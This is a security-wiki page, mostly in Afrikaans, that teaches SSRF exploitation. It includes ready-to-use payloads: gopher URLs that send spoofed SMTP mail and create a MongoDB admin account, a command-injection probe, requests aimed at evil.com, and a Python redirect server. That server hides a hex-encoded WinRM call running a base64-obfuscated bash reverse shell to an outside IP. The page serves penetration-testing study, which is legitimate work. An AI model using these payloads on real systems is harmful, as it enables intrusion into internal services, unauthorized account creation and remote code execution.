# SSRF (Server Side Request Forgery)

{{#include ../../banners/hacktricks-training.md}}

## Basiese Inligting

A **Server-side Request Forgery (SSRF)** kwesbaarheid ontstaan wanneer 'n aanvaller 'n **server-side application** manipuleer sodat dit **HTTP requests** na 'n domein van hul keuse maak. Hierdie kwesbaarheid stel die bediener bloot aan arbitraire eksterne versoeke wat deur die aanvaller gerig word.

## Vang SSRF

Die eerste ding wat jy moet doen, is om 'n SSRF-interaksie wat deur jou gegenereer is, vas te vang. Om 'n HTTP- of DNS-interaksie vas te vang, kan jy hulpmiddels soos die volgende gebruik:

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)
- [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
- [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - A Burp Collaborator using ngrok

## Witgelysde domeine omseil

Meestal sal jy vind dat die SSRF slegs werk in **sekere witgelysde domeine** of URL. Op die volgende bladsy het jy 'n **samestelling van tegnieke om daardie witlys te probeer omseil**:


{{#ref}}
url-format-bypass.md
{{#endref}}

### Bypass via open redirect

As die bediener behoorlik beskerm is, kan jy **al die beperkings omseil deur 'n Open Redirect binne die webblad uit te buit**. Aangesien die webblad **SSRF na dieselfde domein** sal toelaat en waarskynlik **omleidings sal volg**, kan jy die **Open Redirect** uitbuit om die bediener toegang tot enige interne hulpbron te gee.\
Read more here: [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## Protokolle

- **file://**
- Die URL-skema `file://` word genoem, wat direk na `/etc/passwd` verwys: `file:///etc/passwd`
- **dict://**
- Die DICT URL-skema word beskryf as gebruik vir toegang tot definisies of woordelyste deur die DICT-protokol. 'n Voorbeeld illustreer 'n saamgestelde URL wat op 'n spesifieke woord, databasis en inskrywingsnommer mik, asook 'n geval van 'n PHP-skrif wat moontlik misbruik kan word om na 'n DICT-bediener te koppel met aanvaller-voorsien kredensiale: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
- Gelys as 'n protokol vir veilige lêeroordrag oor Secure Shell (SSH); 'n voorbeeld toon hoe 'n PHP-skrif misbruik kan word om met 'n kwaadwillige SFTP-bediener te koppel: `url=sftp://generic.com:11111/`
- **TFTP://**
- Die Trivial File Transfer Protocol wat oor UDP werk, word genoem met 'n voorbeeld van 'n PHP-skrif wat 'n versoek na 'n TFTP-bediener stuur. 'n TFTP-versoek word na 'generic.com' op poort '12346' vir die lêer 'TESTUDPPACKET' gemaak: `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
- Hierdie afdeling dek die Lightweight Directory Access Protocol en beklemtoon die gebruik daarvan vir bestuur en toegang tot verspreide gidsinligtingdienste oor IP-netwerke. Interageer met 'n LDAP-bediener op localhost: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
- 'n Metode word beskryf om SSRF-kwesbaarhede te misbruik om met SMTP-dienste op localhost te kommunikeer, insluitend stappe om interne domeinname te onthul en verdere ondersoekhandelinge gebaseer op daardie inligting.
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF bypass**
- As die SSRF deur **curl** uitgevoer word, het curl 'n funksie genaamd [**URL globbing**](https://everything.curl.dev/cmdline/globbing) wat nuttig kan wees om WAFs te omseil. Byvoorbeeld, in hierdie [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) kan jy hierdie voorbeeld vir 'n **path traversal via `file` protocol** vind:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Die Gopher-protokol se vermoë om IP, poort en bytes te spesifiseer vir kommunikasie met 'n bediener word bespreek, tesame met gereedskap soos Gopherus en remote-method-guesser om payloads te skep. Twee onderskeibare gebruike word geïllustreer:

### Gopher://

Deur hierdie protokol te gebruik kan jy die **IP, poort en bytes** spesifiseer wat jy wil hê die bediener moet **stuur**. Dan kan jy basies 'n SSRF misbruik om te **kommunikeer met enige TCP-bediener** (maar jy moet eers weet hoe om met die diens te praat).\
Gelukkig kan jy [Gopherus](https://github.com/tarunkant/Gopherus) gebruik om payloads vir verskeie dienste te skep. Verder kan [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) gebruik word om _gopher_ payloads vir _Java RMI_ dienste te skep.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP — Back connect to 1337**
```php:redirect.php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
#### Gopher MongoDB -- Skep gebruiker met username=admin, met password=admin123 en met permission=administrator
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## SSRF via Referrer header & Ander

Analytics-sagteware op bedieners teken dikwels die Referrer header aan om inkomende skakels op te spoor, 'n praktyk wat per ongeluk toepassings aan Server-Side Request Forgery (SSRF)-kwesbaarhede blootstel. Dit is omdat sulke sagteware moontlik eksterne URL's wat in die Referrer header genoem word, besoek om verwysingswerf-inhoud te ontleed. Om hierdie kwesbaarhede op te spoor, word die Burp Suite-plugin "**Collaborator Everywhere**" aanbeveel, deur gebruik te maak van die manier waarop analytics-instrumente die Referer header verwerk om potensiële SSRF-aanvalsvlakke te identifiseer.

## SSRF via SNI data from certificate

'n Miskonfigurasie wat die verbinding na enige backend deur 'n eenvoudige opstelling moontlik kan maak, word met 'n voorbeeld Nginx-konfigurasie geïllustreer:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
In hierdie konfigurasie word die waarde uit die Server Name Indication (SNI)-veld direk gebruik as die backend se adres. Hierdie opstelling ontbloot 'n kwetsbaarheid vir Server-Side Request Forgery (SSRF), wat uitgebuit kan word deur eenvoudig die gewenste IP-adres of domeinnaam in die SNI-veld te spesifiseer. 'n Voorbeeld van 'n eksploit om 'n verbinding na 'n ewekansige backend af te dwing, soos `internal.host.com`, met die `openssl` opdrag word hieronder gegee:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## [Wget lêer oplaai](../file-upload/index.html#wget-file-upload-ssrf-trick)

## SSRF with Command Injection

Dit kan die moeite werd wees om 'n payload te probeer soos: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## PDF-weergawes

As die webblad outomaties 'n PDF skep met inligting wat jy verskaf het, kan jy **invoeg van JS wat deur die PDF creator** self (die server) uitgevoer sal word terwyl die PDF geskep word en jy sal 'n SSRF kan misbruik. [**Vind meer inligting hier**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## Van SSRF tot DoS

Skep verskeie sessies en probeer swaar lêers aflaai deur die SSRF vanaf die sessies uit te buit.

## SSRF PHP Funksies

Kyk na die volgende bladsy vir kwesbare PHP en selfs Wordpress funksies:


{{#ref}}
../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md
{{#endref}}

## SSRF Omleiding na Gopher

Vir sommige uitbuitings mag jy 'n **omleidingsrespons stuur** (moontlik om 'n ander protokol soos gopher te gebruik). Hier is verskillende python-kodes om met 'n omleiding te reageer:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
## Verkeerd gekonfigureerde proxies na SSRF

Tricks [**from this post**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

### Flask

<details>

<summary>Flask proxy kwetsbare code</summary>
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
app.run(threaded=False)
```
</details>

Flask laat toe om **`@`** as aanvanklike karakter te gebruik, wat toelaat om die **aanvanklike gasheernaam as gebruikersnaam** te maak en 'n nuwe een in te spuit. Attack request:
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

Kwetsbare kode:

<figure><img src="../../images/image (1201).png" alt=""><figcaption></figcaption></figure>

Daar is ontdek dat dit moontlik is om die **pad** van 'n versoek met die karakter **`;`** te begin, wat dit toelaat om dan **`@`** te gebruik en 'n nuwe host in te voeg om toegang te verkry. Aanvalversoek:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
### PHP ingeboude webbediener <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

<details>

<summary>Kwetsbare PHP-kode</summary>
```php
<?php
$site = "http://ifconfig.me";
$current_uri = $_SERVER['REQUEST_URI'];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

echo "\n\n";

$response = file_get_contents($proxy_site);
var_dump($response);
?>
```
</details>

PHP laat die gebruik toe van die **karakter `*` voor ’n slash in die pad** van die URL, maar dit het ander beperkings: dit kan slegs vir die root-padnaam `/` gebruik word en kolletjies `.` word nie voor die eerste slash toegelaat nie, daarom moet byvoorbeeld ’n puntlose heksadesimaal-gekodeerde IP-adres gebruik word:
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```
## DNS Rebidding CORS/SOP bypass

As jy **probleme** het om **exfiltrate content from a local IP** weens **CORS/SOP**, **DNS Rebidding** kan gebruik word om daardie beperking te omseil:


{{#ref}}
../cors-bypass.md
{{#endref}}

### Outomatiese DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) is 'n hulpmiddel om [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding) aanvallasies uit te voer. Dit bevat die nodige komponente om die IP-adres van die aanvaler se DNS-naam na die teikenmasjien se IP-adres te herbind en om aanvalsladinge te bedien om kwesbare sagteware op die teikenmasjien uit te buit.

Kyk ook na die **openbare bediener by** [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

## DNS Rebidding + TLS Session ID/Session ticket

Vereistes:

- **SSRF**
- **Outbound TLS sessions**
- **Stuff on local ports**

Aanval:

1. Vra die gebruiker/bot om **toegang** te kry tot 'n **domein** wat deur die **aanvaller** beheer word
2. Die **TTL** van die **DNS** is **0** sek (sodat die slagoffer binnekort weer die IP van die domein sal nagaan)
3. 'n **TLS connection** word geskep tussen die slagoffer en die domein van die aanvaller. Die aanvaller plaas die **payload** in die **Session ID** of **Session Ticket**.
4. Die **domein** sal 'n **oneindige lus** van herleiings teen homself begin. Die doel hiervan is om die gebruiker/bot die domein te laat besoek totdat dit weer 'n **DNS request** van die domein uitvoer.
5. In die DNS request word nou 'n **private IP** adres gegee (127.0.0.1 byvoorbeeld)
6. Die gebruiker/bot sal probeer om die **TLS connection** te hervestig, en om dit te doen sal dit die **Session ID/Ticket ID** stuur (waar die **payload** van die aanvaller bevat was). Gefeliciteer — jy het daarin geslaag om die **gebruiker/bot homself te laat aanval**.

Let daarop dat tydens hierdie aanval, as jy localhost:11211 (_memcache_) wil aanval, jy die slagoffer die aanvanklike verbinding met www.attacker.com:11211 moet laat vestig (die **poort moet altyd dieselfde wees**).\
Om **hierdie aanval uit te voer kan jy die tool gebruik**: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
Vir **meer inligting** kyk na die praatjie waar hierdie aanval verduidelik word: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference)

## Blind SSRF

Die verskil tussen 'n blind SSRF en 'n nie-blinde een is dat jy in die blind nie die respons van die SSRF-versoek kan sien nie. Dit maak dit moeiliker om uit te buit omdat jy slegs welbekende kwesbaarhede sal kan misbruik.

### Tydgebaseerde SSRF

**Deur die tyd te kontroleer** van die antwoorde van die bediener kan dit **moontlik wees om te weet of 'n hulpbron bestaan of nie** (miskien neem dit meer tyd om 'n bestaande hulpbron toe te gaan as om een wat nie bestaan nie)

### Van blind tot volle misbruik van statuskodes

Volgens hierdie [**blog post**](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/), kan sommige blind SSRF voorval omdat selfs al reageer die geteikende URL met 'n 200 statuskode (soos AWS metadata), hierdie data nie behoorlik geformatteer is nie en daarom die app mag weier om dit te vertoon.

Dit is egter gevind dat deur sekere herleiingsantwoorde van 305 tot 309 in die SSRF te stuur, dit moontlik kan wees om die aansoek **hierdie herleidings te laat volg terwyl dit in 'n foutmodus inkom** wat nie meer die formaat van die data sal nagaan nie en bloot die data kan uitdruk.

Die Python-bediener wat gebruik is om dit uit te buit is die volgende:
```python
@app.route("/redir")
def redir():
count = int(request.args.get("count", 0)) + 1
# Pump out 305, 306, 307, 308, 309, 310 ...
weird_status = 301 + count
if count >= 10:                      # after 5 “weird” codes
return redirect(METADATA_URL, 302)
return redirect(f"/redir?count={count}", weird_status)

@app.route("/start")
def start():
return redirect("/redir", 302)
```
**Stappe:**
- Eers laat 302 die app begin volg.
- Dan ontvang dit 305 → 306 → 307 → 308 → 309 → 310.
- Na die 5de vreemde kode keer die PoC uiteindelik 302 → 169.254.169.254 → 200 OK terug.

**Wat gebeur binne die teiken:**
- libcurl self volg 305–310; dit normaliseer net onbekende kodes na “follow.”
- Na N vreemde redirects (≥ 5 hier) besluit die toepassing se eie wrapper dat “iets nie reg is nie” en skakel oor na ’n foutmodus bedoel vir debugging.
- In daardie modus dump dit die hele redirect chain plus finale body terug aan die buitenste caller.
- Resultaat: attacker sien elke header + die metadata JSON, missie volbring.

Let wel dat dit interessant is om status codes te leak wat jy voorheen nie kon leak nie (soos ’n 200). Indien jy egter op een of ander manier ook die status code van die response kan kies (stel jou voor jy kan bepaal dat die AWS metadata met ’n 500 status code reageer), **mag daar status codes wees wat die inhoud van die response direk leak.**

### HTML-na-PDF-renderers as blind SSRF gadgets

Biblioteke soos **TCPDF** (en wrappers soos **spipu/html2pdf**) sal outomaties enige URLs wat in deur attacker beheerde HTML voorkom aflaai terwyl ’n PDF gerender word. Elke `<img>` of `<link rel="stylesheet">` attribuut word server-side opgelos via cURL, `getimagesize()`, of `file_get_contents()`, so jy kan die PDF worker dwing om interne hosts te probe, selfs al word geen HTTP response aan jou weerspieël nie.
```
<html>
<body>
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
<link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin" />
</body>
</html>
```
- TCPDF 6.10.0 voer verskeie retrieval attempts uit vir elke `<img>` resource, so 'n enkele payload kan meerdere requests genereer (nuttig vir timing-based port scans).
- html2pdf kopieer TCPDF se gedrag vir `<img>` en voeg CSS fetching by binne `Css::extractStyle()`, wat eenvoudig `file_get_contents($href)` aanroep na 'n oppervlakkige scheme check. Misbruik dit om loopback services, RFC1918 ranges, of cloud metadata endpoints te tref.
- Kombineer hierdie SSRF primitive met die [HTML-to-PDF path traversal tricks](../file-inclusion/README.md#html-to-pdf-svgimg-path-traversal) om beide internal HTTP responses en local files wat in die PDF gerender word te leak.

Hardeners moet external URLs verwyder voor rendering of die renderer isoleer in 'n network sandbox; tot dan, behandel PDF generators as blind SSRF proxies.

## Cloud SSRF Eksploitasie

As jy 'n SSRF-kwetsbaarheid in 'n masjien wat binne 'n cloud environment loop vind, kan jy dalk interessante inligting oor die cloud environment en selfs credentials verkry:


{{#ref}}
cloud-ssrf.md
{{#endref}}

## SSRF Kwesbare Platforme

Verskeie bekende platforme bevat of het SSRF-kwesbaarhede gehad; kyk na hulle in:


{{#ref}}
ssrf-vulnerable-platforms.md
{{#endref}}

## Gereedskap

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

Tool om SSRF vulnerabilities op te spoor en te exploit

### [Gopherus](https://github.com/tarunkant/Gopherus)

- [Blog post on Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

Hierdie tool genereer Gopher payloads vir:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

- [Blog post on SSRF usage](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ is 'n _Java RMI_ vulnerability scanner wat attack operations ondersteun vir die meeste algemene _Java RMI_ vulnerabilities. Die meeste beskikbare operations ondersteun die `--ssrf` option om 'n _SSRF_ payload te genereer vir die gevraagde operation. Saam met die `--gopher` option kan gereed-vir-gebruik _gopher_ payloads direk gegenereer word.

### [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

SSRF Proxy is 'n multi-threaded HTTP proxy server ontwerp om kliënt HTTP verkeer deur HTTP servers wat vulnerable is vir Server-Side Request Forgery (SSRF) te tunnel.

### Om te oefen


{{#ref}}
https://github.com/incredibleindishell/SSRF_Vulnerable_Lab
{{#endref}}

## Verwysings

- [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

